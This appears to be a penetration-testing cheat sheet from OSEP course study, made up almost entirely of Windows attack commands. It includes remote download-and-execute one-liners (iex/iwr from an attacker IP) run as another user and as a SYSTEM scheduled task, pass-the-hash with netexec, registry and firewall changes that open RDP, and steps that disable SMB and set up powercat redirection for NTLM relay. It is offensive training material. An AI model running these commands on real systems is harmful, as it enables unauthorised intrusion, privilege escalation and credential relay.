Just a bunch of tools built/gathered along the OSEP course.

# Map the network (using netexec)
- `nxc smb 172.16.125.0/24 --log hosts.txt` (for windows hosts)

- `nxc ssh 172.16.125.0/24 --log hosts.txt` (for linux hosts)

- `netexec smb 172.16.149.0/24 --log hosts.txt && sed -i 's/x64//g' hosts.txt && cat hosts.txt | awk '{print $9,$11,$11"."$21}' | sed 's/(domain://g' | sed 's/)//g' | uniq | sort -u | tr '[:upper:]' '[:lower:]' | sudo tee -a /etc/hosts` - Automation for `/etc/hosts` file

# Useful Basic Commands:

### <ins>Run command as another user</ins>:
- `Invoke-RunasCs amit 'Password123!' 'powershell iex(iwr http://192.168.45.185/rev.txt -usebasicparsing)' -ForceProfile -CreateProcessFunction 2 -BypassUac`

- `runas.exe /netonly /user:final.com\nina cmd.exe`

### <ins>Set up SMB server (file transfer)</ins>:
- `smbserver.py share $(pwd) -smb2support -username amit -password password` 

- On Victim: `net use \\192.168.45.223\share /U:amit password` 

- Copy files: `copy <FILENAME> \\192.168.45.223\share`

### <ins>Enable RDP and RestrictedAdmin from both Local/Remote</ins>:

Using command prompt: 
- `reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f && reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0 && netsh firewall set service remoteadmin enable && netsh firewall set service remotedesktop enable` 

Using netexec:
- `netexec smb db01 -u administrator -H faf3185b0a608ce2f8afb6f8d133f85b --local-auth -X 'reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f;reg add "hklm\system\currentcontrolset\control\terminal server" /f /v fDenyTSConnections /t REG_DWORD /d 0;netsh firewall set service remoteadmin enable;netsh firewall set service remotedesktop enable' --exec-method atexec`

### <ins>RDP to host using xfreerdp</ins>:
- `xfreerdp /v:172.16.231.221 /u:amit /p:'Password123!' +dynamic-resolution +clipboard`

# Escalate to SYSTEM via Schduele Task
- `schtasks /create /tn "SystemTask" /tr "powershell iex(iwr http://192.168.45.223/hollow.ps1 -useb)" /sc once /st 00:00 /ru SYSTEM`

- `schtasks /run /tn "SystemTask"`

# TCP Port Redirection via powercat.ps1
Mostly be used for NTLM Relay attacks, first step is to allow inbound and outbound connections to our victim machine:

### Using CMD:
- `netsh advfirewall firewall add rule name="Allow Port 445 Inbound" dir=in action=allow protocol=TCP localport=445`
- `netsh advfirewall firewall add rule name="Allow Port 445 Outbound" dir=out action=allow protocol=TCP remoteport=445`

### Using Powershell:
- `New-NetFirewallRule -DisplayName "Allow Port 445 Inbound" -Direction Inbound -Protocol TCP -LocalPort 445 -Action Allow`
- `New-NetFirewallRule -DisplayName "Allow Port 445 Outbound" -Direction Outbound -Protocol TCP -RemotePort 445 -Action Allow`

Now, we will need to disable the SMB port on the victim: 

*Note: Run one by one in CMD, no powershell!)*

    1. sc config LanmanServer start= disabled
    2. sc stop LanmanServer
    3. sc stop srv2
    4. sc stop srvnet

Next, we will invoke powercat.ps1: `iex(iwr http://192.168.45.223/powercat.ps1 -useb)` and run:
- `powercat -l -p 445 -r tcp:<PARROT IP>:445 -rep`

Once it's running we can check if the victim are listening on port 445: `netstat -anto | findstr 445`

Last step is to perform the Relay and see the callback to our machine on port 445 tunneled from the victim!
